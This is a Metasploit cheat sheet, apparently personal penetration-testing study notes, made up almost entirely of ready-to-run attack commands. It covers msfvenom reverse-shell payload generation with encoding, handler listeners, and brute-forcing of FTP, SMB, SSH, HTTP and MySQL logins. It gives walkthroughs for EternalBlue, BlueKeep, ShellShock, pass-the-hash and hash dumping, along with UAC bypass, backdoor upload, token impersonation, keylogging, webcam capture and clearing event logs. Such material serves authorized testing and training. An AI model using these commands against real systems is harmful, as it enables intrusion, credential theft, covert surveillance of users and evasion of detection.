# msfconsole

A detailed set of commands and use cases related to the Metasploit framework

## Commands

#### Basic Usage

```
> msfconsole
	> workspace (display current workspace)
	> workspace -h (display workspace help menu)
	> workspace -a x (create a new x workspace)
	> workspace x (go to workspace x)

	> setg X y (set globally the value of option X to value y)
	> unsetg X (unset globally the value of option X)
	
	> db_status (check db status)
	> db_import x.xml (import xml file)
	> db_import x.nessus (import nessus file)
	> db_nmap -Pn -sS -sv -O -p445 TARGET_IP (perform nmap scan directly from msf)
	> db_nmap -sS -sV -O TARGET_IP
	
	> hosts (display hosts info)
	> services (display services info)
	> vulns (display vulnerabilities info)
		> -p x (to display vulnerability of a given port x)
	> loot (display looted info)
	> creds (display credentials info)
	> analyze (display analyze info)

	> hosts -R (set RHOSTS option to all hosts in DB)
	> service -S x (search in db for specific service x)

	> search x (search for module called x)
	> search type:x name:y (search for a module by type and name)

	> use x (use module called x or with ID number x)
		> info (display module info)
		> show options (display module options)
		> show x (display info about x (payloads, ...))
		> set X y (set option called X with value y)
		> set payload c (set the payload to x configuration)

		> unset x (unset option x)
		> unset all (unset all options)

		> check (if supported, check if the target is vulnerable)

		> run (run the module)
		> exploit -z (run the module in background)
		> exploit (launch the exploit of a module)
			> getpid (get pid meterpreter is running on)
			> ps (list processes running on target)
			> tasklist /m /fi "pid eq XX" (check DLLs used by Meterpreter process)

			> help (displays meterpreter help info)

		    > background: Backgrounds the current session
		    > exit: Terminate the Meterpreter session
		    > guid: Get the session GUID (Globally Unique Identifier)
		    > help: Displays the help menu
		    > info: Displays information about a Post module
		    > irb: Opens an interactive Ruby shell on the current session
		    > load: Loads one or more Meterpreter extensions
		    > migrate: Allows you to migrate Meterpreter to another process
		    > run: Executes a Meterpreter script or Post module
		    > sessions: Quickly switch to another session

		    > cd: Will change directory
		    > ls: Will list files in the current directory (dir will also work)
		    > pwd: Prints the current working directory
		    > edit: will allow you to edit a file
		    > cat: Will show the contents of a file to the screen
		    > rm: Will delete the specified file
		    > search: Will search for files
		    > upload: Will upload a file or directory
		    > download: Will download a file or directory

		    > arp: Displays the host ARP (Address Resolution Protocol) cache
		    > ifconfig: Displays network interfaces available on the target system
		    > netstat: Displays the network connections
		    > portfwd: Forwards a local port to a remote service
		    > route: Allows you to view and modify the routing table

			> clearev: Clears the event logs
		    > execute: Executes a command
		    > getpid: Shows the current process identifier
		    > getuid: Shows the user that Meterpreter is running as
		    > kill: Terminates a process
		    > pkill: Terminates processes by name
		    > ps: Lists running processes
		    > reboot: Reboots the remote computer
		    > shell: Drops into a system command shell
		    > shutdown: Shuts down the remote computer
		    > sysinfo: Gets information about the remote system, such as OS

		    > idletime: Returns the number of seconds the remote user has been idle
		    > keyscan_dump: Dumps the keystroke buffer
		    > keyscan_start: Starts capturing keystrokes
		    > keyscan_stop: Stops capturing keystrokes
		    > screenshare: Allows you to watch the remote user's desktop in real time
		    > screenshot: Grabs a screenshot of the interactive desktop
		    > record_mic: Records audio from the default microphone for X seconds
		    > webcam_chat: Starts a video chat
		    > webcam_list: Lists webcams
		    > webcam_snap: Takes a snapshot from the specified webcam
		    > webcam_stream: Plays a video stream from the specified webcam
		    > getsystem: Attempts to elevate your privilege to that of local system
		    > hashdump: Dumps the contents of the SAM database

			> sysinfo (get system info)
			> getuid (get victim user id)
			> whoami (display victim user info)
			> getprivs (get privileges info)
			
			> pgrep x (gives the PID of process x)
			> migrate x (migrate meterpreter session to process x)

			> hashdump (dump the hashes)

			> load x_mod (load module x in victim system)
			
			> shell (open a shell session)
				> /bin/bash -i (launch a shell session)
					> cat /etc/passwd (list users)
					> uname -a (list kernel info)
					> 

			> run autoroute -s x (add a route to the victim internal subnet)
			
			> background OR 'ctrl + z' (put the meterpreter session in background)
			> exit (exit and kill the meterpreter session)

		> back (exit the current module)

	> sessions (list available sessions)
	> sessions x (use session number x)
	> sessions -i x (interract with session number x)
	> session -K (kill all sessions)
	> session -k x (kill session number x)

	> load x_plug (load a msf plugin)
	> x_plug y (use the x plugin with y options)

	> exit (exit the msfconsole)
```

#### Metasploit Modules

```
tree -L 1 /opt/metasploit-framework/embedded/framework/modules/auxiliary/
```

* Lists all type of auxiliary modules

```
tree -L 1 /opt/metasploit-framework/embedded/framework/modules/encoders/
```

* Lists all type of encoders modules

```
tree -L 2 /opt/metasploit-framework/embedded/framework/modules/evasion/
```

* Lists all type of evasion modules

```
tree -L 1 /opt/metasploit-framework/embedded/framework/modules/exploits/
```

* Lists all type of exploits modules

```
tree -L 1 /opt/metasploit-framework/embedded/framework/modules/nops/
```

* Lists all type of nops (CPU do nothing for 1 cycle) modules

```
tree -L 1 /opt/metasploit-framework/embedded/framework/modules/payloads/
```

* Lists all type of payload modules

```
tree -L 1 /opt/metasploit-framework/embedded/framework/modules/post/
```

* Lists all type of post exploitation modules

#### msfvenom Payloads

```
msfvenom -l payloads
```

* Lists available payloads

```
msfvenom --list payloads | grep meterpreter
```

* Checks for meterpreter versions

```
msfvenom --list formats
```

* Lists supported output formats

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```

* -e for encoding

```
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```

* Linux Executable and Linkable Format (elf)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

* Windows

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

* PHP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

* ASP

```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

* Python

```
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=MY_IP LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx64.exe
```

* Arch x64

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=MY_IP LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
```

* Encoding

## Use Cases

#### Portscan

```
> search portscan
> use auxiliary/scanner/portscan/tcp
	> show options
	> set RHOSTS TARGET_IP
	> run
		> get open ports
	> back
```

#### Connection Handler

```
> use multi/handler
	> set payload windows/meterpreter/reverse_tcp
	> set LHOST MY_IP
	> set LPORT 1234
	> run
		> Listen to oncimming connection
	> back
```

#### Routing to Internal Subnet

```
> search autoroute
> use 0
	> set SESSION 1
	> set SUBNET INTERNAL_SUBNET
	> run
		> route added!
	> back
```

#### ARP Scan on Internal Subnet Already Routed

```
> search arp_sweep
> use 0
	> show options
	> set RHOSTS INTERNAL_SUBNET/24
	> set THREADS 55
	> set SHOST MY_IP
	> set SMAC MY_MAC
	> run
		> Get ARP responses
	> back
```

#### TCP Scan on Internal Subnet Already Routed

```
> search portscan
> use 5
	> show options
	> set RHOSTS INTERNAL_SUBNET/24
	> set THREADS 256
	> run
		> Get port scan results
	> back
```

#### nmap Scan on port 80 on Internal Subnet Already Routed

```
> sessions 1
	> portfwd add -l 1234 -p 80 -r INTERNAL_SUBNET/24
	> background
> db_nmap -sS -A -p 1234 localhost
	> Get nmap scan results
```

#### FTP - Version

```
> search type:auxiliary name:ftp
> use auxiliary/scanner/ftp/ftp_version
	> show options
	> set RHOSTS TARGET_IP
	> run
		> get FTP VERSION
	> search ProFTPD
		> find exploits for this version of FTP
	> back
```

#### FTP - Brute Force

```
> search type:auxiliary name:ftp
> use auxiliary/scanner/ftp/ftp_login
	> show options
	> set RHOSTS TARGET_IP
	> set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	> run
		> brute-force the login
	> back
```

#### FTP - Anon Login

```
> search type:auxiliary name:ftp
> use auxiliary/scanner/ftp/anonymous
	> show options
	> set RHOSTS TARGET_IP
	> run
		> if not connected, then the FTP server is not vulnerable to anon login
	> back
```

#### SMB - Version

```
> search type:auxiliary name:smb
> use auxiliary/scanner/smb/smb_version
	> show options
	> run
		> get SMB VERSION
	> back
```

#### SMB - Users

```
> search type:auxiliary name:smb
> use auxiliary/scanner/smb/smb_enumusers
	> show options
	> run
		> list users
	> back
```

#### SMB - Shares

```
> search type:auxiliary name:smb
> use auxiliary/scanner/smb/smb_enumshares
	> show options
	> set ShowFiles true
	> run
		> list shares
	> back
```

#### SMB - Brute Force

```
> search type:auxiliary name:smb
> use auxiliary/scanner/smb/smb_login
	> show options
	> set SMBUser admin
	> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	> run
		> perform brute-force to find admin pwd
	> back
```

#### SMB - PSExec Connection

```
> search psexec
> use exploit/windows/smb/psexec
	> show options
	> set RHOSTS TARGET_IP
	> set SMBUser Administrator
	> set SMBPass qwertyuiop
	> exploit
		> sysinfo
		> whoami
		> getuid
	> back
```

#### HTTP - Version

```
> search type:auxiliary name:http
> use auxiliary/scanner/http/http_version
	> show options
	> run
		> get HTTP_VERSION
	> back
```

#### HTTP - Header

```
> search type:auxiliary name:http
> use auxiliary/scanner/http/http_header
	> show options
	> run
		> get header info
	> back
```

#### HTTP - robots.txt

```
> search type:auxiliary name:http
> use auxiliary/scanner/http/robots_txt
	> show options
	> run
		> download robots.txt file
	> back
```

#### HTTP - Directories

```
> search type:auxiliary name:http
> use auxiliary/scanner/http/dir_scanner
	> show options
	> run
		> scan the directories (brute-force)
	> back
```

#### HTTP - Files

```
> search type:auxiliary name:http
> use auxiliary/scanner/http/files_dir
	> show options
	> run
		> scan the files (brute-force)
	> back
```

#### HTTP - Brute Force

```
> search type:auxiliary name:http
> use auxiliary/scanner/http/http_login
	> show options
	> set AUTH_URI /DIR_NAME/
	> unset USERPASS_FILE
	> set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
	> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	> set VERBOSE false
	> echo "LOGIN" > user.txt
	> set USER_FILE /root/user.txt
	> run
		> brute-force the login
	> back
```

#### HTTP - Apache User Directory Enumeration

```
> search type:auxiliary name:http
> use auxiliary/scanner/http/apache_userdir_enum
	> show options
	> set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
	> run
		> enumerate users
	> back
```

#### HTTP - Options

```
> use auxiliary/scanner/http/options
	> show options
	> run
	> back
```

#### HTTP - PUT Attack

```
> use auxiliary/scanner/http/http_put
	> show options
	> run
	> set PATH /data/
	> run
	> curl http://TARGET_IP:80/data/msf_http_put_test.txt
	> show options
	> set FILEDATA "This does work"
	> set FILENAME this_works.txt
	> run
	> curl http://TARGET_IP:80/data/this_works.txt
	> back
```

#### SQL - Version

```
> search type:auxiliary name:mysql
> use auxiliary/scanner/mysql/mysql_version
	> show options
	> run
		> get MYSQL_VERSION
	> back
```

#### SQL - Brute Force

```
> search type:auxiliary name:mysql
> use auxiliary/scanner/mysql/mysql_login
	> show options
	> set USERNAME root
	> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	> set VERBOSE false
	> run
		> brute-force login
	> back
```

#### SQL - Enumeration

```
> search type:auxiliary name:mysql
> use auxiliary/scanner/mysql/mysql_enum
	> show options
	> set USERNAME root
	> set PASSWORD TARGET_PASSWORD
	> run
		> enumerate MySQL Server
	> back
```

#### SQL - Execute Queries

```
> search type:auxiliary name:mysql
> use auxiliary/scanner/mysql/mysql_sql
	> show options
	> set USERNAME root
	> set PASSWORD TARGET_PASSWORD
	> set SQL show databases;
	> set SQL use videos;
	> run
		> execute SQL query
	> back
```

#### SQL - Dump Schema

```
> search type:auxiliary name:mysql
> use auxiliary/scanner/mysql/mysql_schemadump
	> show options
	> set USERNAME root
	> set PASSWORD TARGET_PASSWORD
	> run
		> displays schema of the DB
	> back
```

#### SSH - Version

```
> search type:auxiliary name:ssh
> use auxiliary/scanner/ssh/ssh_version
	> show options
	> run
		> get SSH_VERSION
	> back
```

#### SSH - Brute Force

```
> search type:auxiliary name:ssh
> use auxiliary/scanner/ssh/ssh_login
	> show options
	> set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
	> run
		> brute-force login
	> sessions
	> sessions 1
		> access the server by the ssh session created by the module
		> /bin/bash -i
		> ls
		> whoami
		> exit
	> back
```

#### SSH - User Enumeration

```
> search type:auxiliary name:ssh
> use auxiliary/scanner/ssh/ssh_enumusers
	> show options
	> set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	> run
		> enum users
	> back
```

#### SMTP - Version

```
> search type:auxiliary name:smtp
> use auxiliary/scanner/smtp/smtp_version
	> show options
	> run
		> get SMTP_VERSION
	> back
```

#### SMTP - Enumeration

```
> search type:auxiliary name:smtp
> use auxiliary/scanner/smtp/smtp_enum
	> info
	> show options
	> run
		> enumerate users
	> back
```

#### EternalBlue - Search

```
> search type:exploit name:Microsoft IIS
> search type:exploit name:MySQL 5.5
> search type:exploit name:Sun GlassFish
> use exploit/multi/http/glassfish_deployer
	> info
	> set payload windows/meterpreter/reverse_tcp
	> show options
	> back
```

#### EternalBlue - Scan

```
> search eternalblue
> use scanner/smb/smb_ms17_010
	> show options
	> run
	> back
```

#### EternalBlue - Attack

```
> use exploit/windows/smb/ms17_010_eternalblue
	> show options
	> set RHOSTS TARGET_IP
	> exploit
		> sysinfo
		> getuid
		> exit
	> back
```

#### BlueKeep - Scan

```
> search BlueKeep
> use scanner/rdp/cve_2019_0708_bluekeep
	> show options
	> set RHOSTS TARGET_IP
	> run
	> back
```

#### BlueKeep - Attack

```
> search BlueKeep
> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
	> show options
	> set RHOSTS TARGET_IP
	> show targets
	> set target 2
	> exploit
		> sysinfo
		> getuid
	> back
```

#### Pass-the-Hash - Get NTLM hashes

```
> search badblue
> use windows/http/badblue_passthru
	> show options
	> set RHOSTS TARGET_IP
	> exploit
		> pgrep lsass
			> give you TARGET_LSASS
		> migrate TARGET_LSAS
		> getuid
		> load kiwi
		> lsa_dump_sam
			> gives ADMIN_NTLM_HASH
		> hashdump
			> gives ADMIN_LM_HASH + ADMIN_NTLM_HASH
		> ctrl + z
			> put the meterpreter in background
	> back
```

#### Pass-the-Hash - Attack

```
> search psexec
> use exploit/windows/smb/psexec
	> show options
	> set LPORT 4422
	> set RHOSTS TARGET_IP
	> set SMBUser TARGET_ADMIN_USER
	> set SMBPass ADMIN_LM_HASH + ADMIN_NTLM_HASH
	> set target
		> shows target options
	> set target Command
	> set target Native\ upload
	> exploit
		> sysinfo
		> getuid
		> exit
	> back
```

#### ShellShock

```
Perform ShellShock Attack
> search shellshock
> use exploit/multi/http/apache_mod_cgi_bash_env_exec
	> show options
	> set RHOSTS TARGET_IP
	> set TARGETURI /gettime.cgi
	> exploit
		> sysinfo
	> back
```

#### WebDav - Connection Handler

```
> use multi/handler
	> set payload windows/meterpreter/reverse_tcp
	> set LHOST MY_IP
	> set LPORT 1234
	> run
	> sysinfo
		> getuid
		> exit
	> back
```

#### WebDav - IIS Upload

```
> search iis upload
> use exploit/windows/iis/iis_webdav_upload_asp
	> show options
	> set HttpUsername bob
	> set HttpPassword password_123321
	> set RHOSTS TARGET_IP
	> set PATH /webdav/metasploit.asp
	> exploit
		> sysinfo
		> getuid
		> exit
	> back
```

#### RDP

```
Scan for RDP vulnerability
> search rdp_scanner
> use auxiliary/scanner/rdp/rdp_scanner
	> show options
	> set RHOSTS TARGET_IP
	> set RPORT 3333
	> run
	> back
```

#### WinRM

```
> use exploit/windows/winrm/winrm_script_exec
	> show options
	> set RHOSTS TARGET_IP
	> set FORCE_VBs true
	> set USERNAME administrator
	> set PASSWORD tinkerbell
	> exploit
		> sysinfo
		> getuid
	> back
```

#### Kernel

```
> sessions
> sessions 3
	> getuid
	> getprivs
	> getsystem
	>ctrl + z
> search suggester
> use post/multi/recon/local_exploit_suggester
	> show options
	> run
	> back
> use exploit/windows/local/ms16_014_wmi_recv_notif
	> show options
	> set SESSION 3
	> set LPORT 4422
	> exploit
		> getuid
		> exit
	> back
> session 3
	> getuid
	> shell
		> systeminfo
			> get COPY_INFO
```

```
> sessions 3
	> cd C:\\
	> ls
	> cd Temp\\ --> always put malicious code into non-popular directories
	> ls
	> upload ~/Downloads/41015.exe
	> shell
		> dir
		> .\41015.exe
		> .\41015.exe 7
			> whoami
			> exit
		> exit
	> exit
```

#### UAC

```
> setg RHOSTS TARGET_IP
> search rejetto
> use exploit/windows/http/rejetto_hfs_exec
	> show options
	> exploit
		> sysinfo
		> pgrep explorer
			> 2448
		> migrate 2448
		> sysinfo
		> getuid
		> getprevs
		> shell
			> net user
			> net localgroup administrators
			> net user admin password123
				> refused ! --> UAC
		> exit
	> back
```

```
> use multi/handler
	> set payload windows/meterpreter/reverse_tcp
	> set LHOST MY_IP
	> set LPORT 1234
	> run
```

```
> setg RHOSTS TARGET_IP
> search rejetto
> use exploit/windows/http/rejetto_hfs_exec
	> show options
	> exploit
		> pwd
		> getuid
		> getprivs
		> C:\\
		> mkdir Temp
		> cd Temp
		> upload backdoor.exe
		> upload /root/Desktop/tools/UACME/Akagi64.exe
		> shell
			> dir
			> .\Akagi64.exe 23 C:\Temp\backdoor.exe
		> exit
	> back
```

```
> use multi/handler
	> get access !
	> sysinfo
	> getuid
	> getprivs
	> ps
	> migrate 688 (688 = PID of lsass.exe)
	> sysinfo
	> getuid
```

#### Access Token Impersonation

```
> search rejetto
> use exploit/windows/http/rejetto_hfs_exec
	> show options
	> set RHOSTS TARGET_IP
	> exploit
		> sysinfo
		> pgrep explorer
		> migrate 3512
			> Failed --> not enough privileges
		> getuid
		> getprivs
		> load incognito
		> list_tokens -u
		> impersonate_token "ATTACKDEFENSE\Administrator"
		> getuid
		> getprivs
		> pgrep explorer
		> migrate 3512
		> getprivs
		> getuid
		> list_tokens -u
			> if no token --> potato attack
		> impersonate_token "NT AUTHORITY\SYSTEM"
		> getuid
		> getprivs
```